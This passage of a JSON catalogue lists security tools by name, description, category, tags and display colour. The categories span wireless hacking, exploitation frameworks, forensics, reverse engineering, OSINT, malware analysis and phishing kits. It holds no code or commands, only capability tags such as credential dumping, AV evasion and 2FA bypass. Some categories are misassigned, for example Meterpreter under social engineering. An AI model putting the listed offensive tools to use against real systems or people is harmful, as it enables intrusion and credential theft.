    "color": "#e54bc3"
  },
  {
    "name": "Wifiphisher",
    "description": "A rogue Access Point framework for conducting phishing attacks.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "rogue ap",
      "social engineering"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Pyrit",
    "description": "A powerful tool for WPA/WPA2-PSK key cracking.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa cracking",
      "gpu",
      "pre-computation"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "FakeAP",
    "description": "A script that creates a fake 802.11b access point.",
    "category": "Wireless Hacking",
    "tags": [
      "fake ap",
      "honeypot",
      "mitm"
    ],
    "color": "#e54b75"
  },
  {
    "name": "airmon-ng",
    "description": "Part of aircrack-ng, used to enable monitor mode on wireless interfaces.",
    "category": "Wireless Hacking",
    "tags": [
      "monitor mode",
      "wifi",
      "packet capture"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "airodump-ng",
    "description": "Part of aircrack-ng, used for packet capturing of raw 802.11 frames.",
    "category": "Wireless Hacking",
    "tags": [
      "packet capture",
      "wifi scanner",
      "bssid"
    ],
    "color": "#4be575"
  },
  {
    "name": "Metasploit",
    "description": "A penetration testing platform that enables you to find, exploit, and validate vulnerabilities.",
    "category": "Exploitation Frameworks",
    "tags": [
      "exploit development",
      "payload generation",
      "post-exploitation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Mimikatz",
    "description": "A tool to extract plain text passwords, hash, PIN code and kerberos tickets from memory.",
    "category": "Exploitation Frameworks",
    "tags": [
      "credential dumping",
      "pass-the-hash",
      "golden ticket"
    ],
    "color": "#9be54b"
  },
  {
    "name": "PowerSploit",
    "description": "A collection of PowerShell modules for penetration testing.",
    "category": "Exploitation Frameworks",
    "tags": [
      "powershell",
      "post-exploitation",
      "windows"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Empire",
    "description": "A post-exploitation framework that includes a pure-PowerShell2.0 Windows agent.",
    "category": "Exploitation Frameworks",
    "tags": [
      "post-exploitation",
      "c2",
      "powershell"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Cobalt Strike",
    "description": "A commercial threat emulation software for adversary simulations.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "red team",
      "adversary simulation"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Canvas",
    "description": "A commercial penetration testing tool with hundreds of exploits.",
    "category": "Exploitation Frameworks",
    "tags": [
      "exploit framework",
      "vulnerability assessment"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Core Impact",
    "description": "An automated penetration testing tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "automated pentesting",
      "exploitation"
    ],
    "color": "#a04be5"
  },
  {
    "name": "SET",
    "description": "The Social-Engineer Toolkit, designed for social engineering attacks.",
    "category": "Exploitation Frameworks",
    "tags": [
      "social engineering",
      "phishing",
      "payload generation"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Veil Framework",
    "description": "A tool designed to generate metasploit payloads that bypass common anti-virus solutions.",
    "category": "Exploitation Frameworks",
    "tags": [
      "av evasion",
      "payload generation",
      "metasploit"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Shellter",
    "description": "A dynamic shellcode injection tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "av evasion",
      "shellcode",
      "pe infection"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "msfvenom",
    "description": "A standalone payload generator from Metasploit.",
    "category": "Exploitation Frameworks",
    "tags": [
      "payload generation",
      "shellcode",
      "encoders"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Armitage",
    "description": "A graphical cyber attack management tool for Metasploit.",
    "category": "Exploitation Frameworks",
    "tags": [
      "metasploit gui",
      "visualization",
      "red team"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Routersploit",
    "description": "An open-source exploitation framework for embedded devices.",
    "category": "Exploitation Frameworks",
    "tags": [
      "router",
      "iot",
      "embedded devices"
    ],
    "color": "#c34be5"
  },
  {
    "name": "CrackMapExec",
    "description": "A post-exploitation tool that helps automate assessing the security of large Active Directory networks.",
    "category": "Exploitation Frameworks",
    "tags": [
      "active directory",
      "post-exploitation",
      "smb"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Impacket",
    "description": "A collection of Python classes for working with network protocols.",
    "category": "Exploitation Frameworks",
    "tags": [
      "python",
      "network protocols",
      "active directory"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Pupy",
    "description": "An open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "rat",
      "c2",
      "cross-platform"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Nishang",
    "description": "A framework and collection of scripts and payloads which enables usage of PowerShell for penetration testing.",
    "category": "Exploitation Frameworks",
    "tags": [
      "powershell",
      "post-exploitation",
      "scripts"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Scythe",
    "description": "A commercial command-and-control (C2) platform for red and purple teams.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "red team",
      "adversary emulation"
    ],
    "color": "#4be575"
  },
  {
    "name": "Covenant",
    "description": "A .NET command and control framework that aims to highlight the attack surface of .NET.",
    "category": "Exploitation Frameworks",
    "tags": [
      ".net",
      "c2",
      "post-exploitation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Koadic",
    "description": "A Windows post-exploitation rootkit that uses VBScript and JScript.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "post-exploitation",
      "windows",
      "jscript"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Volatility",
    "description": "An open-source memory forensics framework.",
    "category": "Forensics",
    "tags": [
      "memory analysis",
      "malware analysis",
      "incident response"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Autopsy",
    "description": "A digital forensics platform and graphical interface to The Sleuth Kit.",
    "category": "Forensics",
    "tags": [
      "disk analysis",
      "file system analysis",
      "timeline analysis"
    ],
    "color": "#e54b75"
  },
  {
    "name": "The Sleuth Kit",
    "description": "A library and collection of command line tools for forensic analysis of disk images.",
    "category": "Forensics",
    "tags": [
      "disk forensics",
      "file system",
      "cli"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "EnCase",
    "description": "A commercial digital forensics platform.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "forensic analysis",
      "commercial"
    ],
    "color": "#4be575"
  },
  {
    "name": "FTK Imager",
    "description": "A data preview and imaging tool that lets you quickly assess electronic evidence.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "triage",
      "evidence preview"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "SIFT Workstation",
    "description": "SANS Investigative Forensic Toolkit, a collection of free and open-source incident response and forensic tools.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "incident response",
      "sans"
    ],
    "color": "#9be54b"
  },
  {
    "name": "DEFT Linux",
    "description": "Digital Evidence & Forensics Toolkit, a Linux distribution for forensics.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "live cd",
      "incident response"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "CAINE",
    "description": "Computer Aided INvestigative Environment, an Italian GNU/Linux live distribution for digital forensics.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "live cd",
      "investigation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Redline",
    "description": "A free endpoint security tool that provides host investigative capabilities.",
    "category": "Forensics",
    "tags": [
      "memory analysis",
      "ioc",
      "endpoint forensics"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Bulk Extractor",
    "description": "A tool that scans a disk image, a file, or a directory of files and extracts useful information.",
    "category": "Forensics",
    "tags": [
      "data carving",
      "disk analysis",
      "feature extraction"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "X-Ways Forensics",
    "description": "An advanced work environment for computer forensic examiners.",
    "category": "Forensics",
    "tags": [
      "disk analysis",
      "file recovery",
      "commercial"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Registry Recon",
    "description": "A tool for extracting and analyzing Windows registry data.",
    "category": "Forensics",
    "tags": [
      "windows registry",
      "forensics",
      "artifact analysis"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "F-Response",
    "description": "Provides read-only access to remote disks, memory, and RAID.",
    "category": "Forensics",
    "tags": [
      "remote forensics",
      "live analysis",
      "incident response"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Log2timeline/Plaso",
    "description": "A framework for generating super timelines from various log files and artifacts.",
    "category": "Forensics",
    "tags": [
      "timeline analysis",
      "log analysis",
      "super timeline"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Network Miner",
    "description": "A Network Forensic Analysis Tool (NFAT) for Windows.",
    "category": "Forensics",
    "tags": [
      "pcap analysis",
      "network forensics",
      "file extraction"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Guymager",
    "description": "A free forensic imager for media acquisition.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "forensic acquisition",
      "gui"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Magnet AXIOM",
    "description": "A complete digital investigation platform.",
    "category": "Forensics",
    "tags": [
      "forensics",
      "incident response",
      "commercial"
    ],
    "color": "#c34be5"
  },
  {
    "name": "ExifTool",
    "description": "A platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.",
    "category": "Forensics",
    "tags": [
      "metadata",
      "exif",
      "file analysis"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Scalpel",
    "description": "A fast file carver that reads a database of header and footer definitions.",
    "category": "Forensics",
    "tags": [
      "file carving",
      "data recovery",
      "forensics"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Cellebrite UFED",
    "description": "A commercial tool for mobile device forensics.",
    "category": "Forensics",
    "tags": [
      "mobile forensics",
      "data extraction",
      "commercial"
    ],
    "color": "#e54b75"
  },
  {
    "name": "IDA Pro",
    "description": "A multi-processor disassembler and debugger.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "debugger",
      "static analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Ghidra",
    "description": "A software reverse engineering (SRE) framework developed by the NSA.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "decompiler",
      "sre",
      "free"
    ],
    "color": "#4be575"
  },
  {
    "name": "Radare2",
    "description": "A framework for reverse engineering and analyzing binaries.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "debugger",
      "cli"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Cutter",
    "description": "A GUI for Radare2.",
    "category": "Reverse Engineering",
    "tags": [
      "radare2",
      "gui",
      "disassembler"
    ],
    "color": "#9be54b"
  },
  {
    "name": "x64dbg",
    "description": "An open-source x64/x32 debugger for Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "dynamic analysis"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "OllyDbg",
    "description": "A 32-bit assembler level analysing debugger for Microsoft Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "x86"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Immunity Debugger",
    "description": "A powerful way to write exploits, analyze malware, and reverse engineer binary files.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "exploit development",
      "python scripting"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "WinDbg",
    "description": "A multipurpose debugger for Microsoft Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "kernel debugging"
    ],
    "color": "#4be575"
  },
  {
    "name": "Binary Ninja",
    "description": "A commercial reverse engineering platform.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "intermediate language",
      "commercial"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Hopper Disassembler",
    "description": "A reverse engineering tool for macOS and Linux.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "decompiler",
      "osx"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Angr",
    "description": "A platform-agnostic binary analysis framework.",
    "category": "Reverse Engineering",
    "tags": [
      "binary analysis",
      "symbolic execution",
      "python"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Binwalk",
    "description": "A fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.",
    "category": "Reverse Engineering",
    "tags": [
      "firmware analysis",
      "extraction",
      "entropy analysis"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "GDB",
    "description": "The GNU Project debugger.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "linux",
      "cli"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Valgrind",
    "description": "An instrumentation framework for building dynamic analysis tools.",
    "category": "Reverse Engineering",
    "tags": [
      "dynamic analysis",
      "memory profiling",
      "linux"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Frida",
    "description": "A dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.",
    "category": "Reverse Engineering",
    "tags": [
      "dynamic instrumentation",
      "hooking",
      "scriptable"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Apktool",
    "description": "A tool for reverse engineering Android apk files.",
    "category": "Reverse Engineering",
    "tags": [
      "android",
      "apk",
      "decompiling"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Jadx",
    "description": "A Dex to Java decompiler for Android.",
    "category": "Reverse Engineering",
    "tags": [
      "android",
      "dex",
      "decompiler",
      "gui"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "dnSpy",
    "description": "A .NET debugger and assembly editor.",
    "category": "Reverse Engineering",
    "tags": [
      ".net",
      "debugger",
      "assembly editor"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "ILSpy",
    "description": "An open-source .NET assembly browser and decompiler.",
    "category": "Reverse Engineering",
    "tags": [
      ".net",
      "decompiler",
      "assembly browser"
    ],
    "color": "#75e54b"
  },
  {
    "name": "PE-bear",
    "description": "A freeware portable executable (PE) file explorer.",
    "category": "Reverse Engineering",
    "tags": [
      "pe file",
      "windows",
      "static analysis"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "OpenSSL",
    "description": "A robust, commercial-grade, and full-featured toolkit for the TLS and SSL protocols.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "encryption",
      "certificates"
    ],
    "color": "#c34be5"
  },
  {
    "name": "GnuPG (GPG)",
    "description": "A complete and free implementation of the OpenPGP standard.",
    "category": "Cryptography Tools",
    "tags": [
      "pgp",
      "encryption",
      "signing",
      "privacy"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "CrypTool",
    "description": "An open-source e-learning application used in the implementation and analysis of cryptographic algorithms.",
    "category": "Cryptography Tools",
    "tags": [
      "cryptanalysis",
      "education",
      "visualization"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "FeatherDuster",
    "description": "An automated, modular cryptanalysis tool.",
    "category": "Cryptography Tools",
    "tags": [
      "cryptanalysis",
      "classical ciphers",
      "automation"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Cryptcat",
    "description": "A lightweight version of netcat with twofish encryption.",
    "category": "Cryptography Tools",
    "tags": [
      "encrypted chat",
      "netcat",
      "twofish"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Keyczar",
    "description": "An open source cryptographic toolkit designed to make it easier and safer for developers to use cryptography.",
    "category": "Cryptography Tools",
    "tags": [
      "crypto library",
      "key management",
      "api"
    ],
    "color": "#4be575"
  },
  {
    "name": "Certbot",
    "description": "A free, open source software tool for automatically using Let's Encrypt certificates.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "letsencrypt",
      "automation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Aescrypt",
    "description": "A file encryption software that uses the AES-256 algorithm.",
    "category": "Cryptography Tools",
    "tags": [
      "file encryption",
      "aes",
      "cross-platform"
    ],
    "color": "#9be54b"
  },
  {
    "name": "VeraCrypt",
    "description": "A free open source disk encryption software for Windows, Mac OSX and Linux.",
    "category": "Cryptography Tools",
    "tags": [
      "disk encryption",
      "fde",
      "plausible deniability"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "LUKS",
    "description": "Linux Unified Key Setup, the standard for Linux hard disk encryption.",
    "category": "Cryptography Tools",
    "tags": [
      "disk encryption",
      "linux",
      "dm-crypt"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Bcrypt",
    "description": "A password hashing function based on the Blowfish cipher.",
    "category": "Cryptography Tools",
    "tags": [
      "password hashing",
      "key stretching"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Scrypt",
    "description": "A password-based key derivation function.",
    "category": "Cryptography Tools",
    "tags": [
      "password hashing",
      "kdf",
      "memory-hard"
    ],
    "color": "#4be575"
  },
  {
    "name": "pkcs11-tool",
    "description": "A tool for managing keys and certificates on PKCS#11 devices.",
    "category": "Cryptography Tools",
    "tags": [
      "hsm",
      "smart card",
      "pkcs11"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "sslscan",
    "description": "A tool to test SSL/TLS enabled services to discover supported cipher suites.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "cipher suite",
      "scanner"
    ],
    "color": "#9be54b"
  },
  {
    "name": "testssl.sh",
    "description": "A free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as cryptographic flaws.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "vulnerability scanner",
      "bash"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Yersinia",
    "description": "A network tool designed to take advantage of some weakeness in different network protocols.",
    "category": "Cryptography Tools",
    "tags": [
      "network protocol attacks",
      "cisco",
      "layer 2"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Httprint",
    "description": "A web server fingerprinting tool.",
    "category": "Cryptography Tools",
    "tags": [
      "fingerprinting",
      "web server",
      "signature-based"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Crypton",
    "description": "A tool for encrypting and decrypting files and messages.",
    "category": "Cryptography Tools",
    "tags": [
      "encryption",
      "cli",
      "aes"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Steghide",
    "description": "A steganography program that hides data in various kinds of image- and audio-files.",
    "category": "Cryptography Tools",
    "tags": [
      "steganography",
      "data hiding"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Outguess",
    "description": "A universal steganographic tool.",
    "category": "Cryptography Tools",
    "tags": [
      "steganography",
      "data hiding"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Maltego",
    "description": "A tool for open-source intelligence and forensics.",
    "category": "OSINT",
    "tags": [
      "data mining",
      "visualization",
      "link analysis"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "theHarvester",
    "description": "A tool for gathering subdomain names, e-mail addresses, virtual hosts, open ports/banners, and employee names from different public sources.",
    "category": "OSINT",
    "tags": [
      "email gathering",
      "subdomain enumeration"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Shodan",
    "description": "A search engine for Internet-connected devices.",
    "category": "OSINT",
    "tags": [
      "iot",
      "search engine",
      "device discovery"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Recon-ng",
    "description": "A full-featured Web Reconnaissance framework written in Python.",
    "category": "OSINT",
    "tags": [
      "web reconnaissance",
      "framework",
      "automation"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "SpiderFoot",
    "description": "An open source intelligence (OSINT) automation tool.",
    "category": "OSINT",
    "tags": [
      "automation",
      "data correlation",
      "reconnaissance"
    ],
    "color": "#c34be5"
  },
  {
    "name": "Google Dorks",
    "description": "Advanced Google searching techniques to find information.",
    "category": "OSINT",
    "tags": [
      "google hacking",
      "search operators",
      "information leakage"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "TinEye",
    "description": "A reverse image search engine.",
    "category": "OSINT",
    "tags": [
      "reverse image search",
      "image analysis"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Creepy",
    "description": "A geolocation OSINT tool.",
    "category": "OSINT",
    "tags": [
      "geolocation",
      "social media",
      "tracking"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Metagoofil",
    "description": "An information gathering tool designed for extracting metadata of public documents.",
    "category": "OSINT",
    "tags": [
      "metadata extraction",
      "document analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "FOCA",
    "description": "Fingerprinting Organizations with Collected Archives, a tool used mainly to find metadata and hidden information in the documents it scans.",
    "category": "OSINT",
    "tags": [
      "metadata",
      "document analysis",
      "network discovery"
    ],
    "color": "#4be575"
  },
  {
    "name": "Censys",
    "description": "A platform that helps researchers understand the hosts and networks that compose the global Internet.",
    "category": "OSINT",
    "tags": [
      "internet scan",
      "network data",
      "research"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "ZoomEye",
    "description": "A cyberspace search engine to find specific network assets.",
    "category": "OSINT",
    "tags": [
      "search engine",
      "network assets",
      "iot"
    ],
    "color": "#9be54b"
  },
  {
    "name": "GHDB",
    "description": "Google Hacking Database, an index of search queries (dorks) used to find publicly available information.",
    "category": "OSINT",
    "tags": [
      "google dorks",
      "database",
      "vulnerabilities"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "OSINT Framework",
    "description": "A web-based framework for navigating the vast world of OSINT resources.",
    "category": "OSINT",
    "tags": [
      "resource directory",
      "mind map",
      "osint tools"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Twint",
    "description": "An advanced Twitter scraping tool.",
    "category": "OSINT",
    "tags": [
      "twitter",
      "data scraping",
      "social media"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sherlock",
    "description": "Hunt down social media accounts by username across social networks.",
    "category": "OSINT",
    "tags": [
      "username search",
      "social media",
      "profiling"
    ],
    "color": "#4be575"
  },
  {
    "name": "Photon",
    "description": "An incredibly fast crawler which extracts URLs, emails, files, website accounts and much more.",
    "category": "OSINT",
    "tags": [
      "web crawler",
      "data extraction",
      "reconnaissance"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "BuiltWith",
    "description": "A website profiler tool that finds out the technology stack of any website.",
    "category": "OSINT",
    "tags": [
      "technology profiling",
      "web analysis",
      "fingerprinting"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Wayback Machine",
    "description": "A digital archive of the World Wide Web.",
    "category": "OSINT",
    "tags": [
      "website archive",
      "historical data",
      "reconnaissance"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Netcraft",
    "description": "An internet services company that provides web server and web hosting market-share analysis.",
    "category": "OSINT",
    "tags": [
      "site report",
      "phishing protection",
      "web analysis"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Cuckoo Sandbox",
    "description": "An automated dynamic malware analysis system.",
    "category": "Malware Analysis",
    "tags": [
      "sandbox",
      "dynamic analysis",
      "automation"
    ],
    "color": "#56e54b"
  },
  {
    "name": "YARA",
    "description": "The pattern matching swiss knife for malware researchers.",
    "category": "Malware Analysis",
    "tags": [
      "pattern matching",
      "malware identification",
      "rules"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "PEid",
    "description": "A tool that detects most common packers, cryptors and compilers for PE files.",
    "category": "Malware Analysis",
    "tags": [
      "packer detection",
      "pe file",
      "static analysis"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Process Hacker",
    "description": "A powerful multi-purpose tool that helps you monitor system resources, debug software and detect malware.",
    "category": "Malware Analysis",
    "tags": [
      "process monitoring",
      "system analysis",
      "debugging"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "ProcMon",
    "description": "Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.",
    "category": "Malware Analysis",
    "tags": [
      "process monitoring",
      "registry",
      "file system"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Regshot",
    "description": "An open-source registry compare utility that allows you to take a snapshot of your registry.",
    "category": "Malware Analysis",
    "tags": [
      "registry analysis",
      "snapshot",
      "comparison"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "INetSim",
    "description": "A software suite for simulating common internet services in a lab environment.",
    "category": "Malware Analysis",
    "tags": [
      "network simulation",
      "malware lab",
      "service emulation"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Fakenet-NG",
    "description": "A next generation dynamic network analysis tool for malware analysts and penetration testers.",
    "category": "Malware Analysis",
    "tags": [
      "network simulation",
      "dynamic analysis",
      "pcap"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "BinText",
    "description": "A small, very fast and powerful text extractor that can be of particular interest to programmers.",
    "category": "Malware Analysis",
    "tags": [
      "string extraction",
      "static analysis",
      "binary"
    ],
    "color": "#c34be5"
  },
  {
    "name": "UPX",
    "description": "The Ultimate Packer for eXecutables.",
    "category": "Malware Analysis",
    "tags": [
      "packer",
      "unpacker",
      "executable compression"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Remnux",
    "description": "A Linux toolkit for reverse-engineering and analyzing malicious software.",
    "category": "Malware Analysis",
    "tags": [
      "malware analysis distro",
      "toolkit",
      "reverse engineering"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "VirusTotal",
    "description": "A free service that analyzes files and URLs for viruses, worms, trojans and other kinds of malicious content.",
    "category": "Malware Analysis",
    "tags": [
      "online scanner",
      "multi-av",
      "reputation"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Hybrid Analysis",
    "description": "A free malware analysis service that detects and analyzes unknown threats using a unique Hybrid Analysis technology.",
    "category": "Malware Analysis",
    "tags": [
      "online sandbox",
      "threat intelligence",
      "static analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Any.Run",
    "description": "An interactive online malware analysis service.",
    "category": "Malware Analysis",
    "tags": [
      "interactive sandbox",
      "online analysis",
      "dynamic analysis"
    ],
    "color": "#4be575"
  },
  {
    "name": "ThreatCrowd",
    "description": "A search engine for threats.",
    "category": "Malware Analysis",
    "tags": [
      "threat intelligence",
      "osint",
      "correlation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Joe Sandbox",
    "description": "A commercial deep malware analysis platform.",
    "category": "Malware Analysis",
    "tags": [
      "sandbox",
      "dynamic analysis",
      "commercial"
    ],
    "color": "#9be54b"
  },
  {
    "name": "pestudio",
    "description": "A tool for static analysis of malicious Windows executables.",
    "category": "Malware Analysis",
    "tags": [
      "static analysis",
      "pe file",
      "indicators"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Fiddler",
    "description": "A free web debugging proxy for any browser, system or platform.",
    "category": "Malware Analysis",
    "tags": [
      "proxy",
      "http debugging",
      "network traffic"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Sysinternals Suite",
    "description": "A suite of technical utilities to manage, diagnose, troubleshoot and monitor a Microsoft Windows environment.",
    "category": "Malware Analysis",
    "tags": [
      "windows",
      "system utilities",
      "troubleshooting"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Mandiant Redline",
    "description": "Provides host investigative capabilities to users to find signs of malicious activity through memory and file analysis.",
    "category": "Malware Analysis",
    "tags": [
      "incident response",
      "memory forensics",
      "ioc"
    ],
    "color": "#4be575"
  },
  {
    "name": "Gophish",
    "description": "An open-source phishing toolkit.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "campaign management",
      "awareness training"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "CredSniper",
    "description": "A phishing framework written in Python with a web front-end.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "credential harvesting",
      "automation"
    ],
    "color": "#9be54b"
  },
  {
    "name": "King Phisher",
    "description": "A phishing campaign toolkit used for creating and managing multiple simultaneous phishing attacks.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "campaigns",
      "server"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Evilginx2",
    "description": "A man-in-the-middle attack framework used for phishing login credentials along with session cookies.",
    "category": "Social Engineering",
    "tags": [
      "mitm",
      "phishing",
      "2fa bypass"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Modlishka",
    "description": "A flexible and powerful reverse proxy, that will take your phishing campaigns to the next level.",
    "category": "Social Engineering",
    "tags": [
      "reverse proxy",
      "phishing",
      "2fa bypass"
    ],
    "color": "#56e54b"
  },
  {
    "name": "BlackEye",
    "description": "A complete phishing tool with 32 templates + 1 customizable.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "templates",
      "credential harvesting"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Shellphish",
    "description": "A phishing tool for 18 social media sites.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "social media",
      "templates"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Zphisher",
    "description": "An automated phishing tool with 30+ templates.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "automation",
      "templates"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "PhoneInfoga",
    "description": "An advanced information gathering tool for phone numbers.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "phone number",
      "reconnaissance"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "UserRecon",
    "description": "Find usernames across over 75 social networks.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "username search",
      "social media"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "FinalRecon",
    "description": "A fast and simple python script for web reconnaissance.",
    "category": "Social Engineering",
    "tags": [
      "reconnaissance",
      "web",
      "osint"
    ],
    "color": "#75e54b"
  },
  {
    "name": "DNSChef",
    "description": "A highly configurable DNS proxy for pentesters.",
    "category": "Social Engineering",
    "tags": [
      "dns proxy",
      "phishing",
      "network attacks"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Meterpreter",
    "description": "An advanced, dynamically extensible payload that uses in-memory DLL injection stagers.",
    "category": "Social Engineering",
    "tags": [
      "payload",
      "metasploit",
      "post-exploitation"
    ],
    "color": "#c34be5"
  },
  {
    "name": "USB Rubber Ducky",
    "description": "A keystroke injection tool disguised as a generic USB thumb drive.",
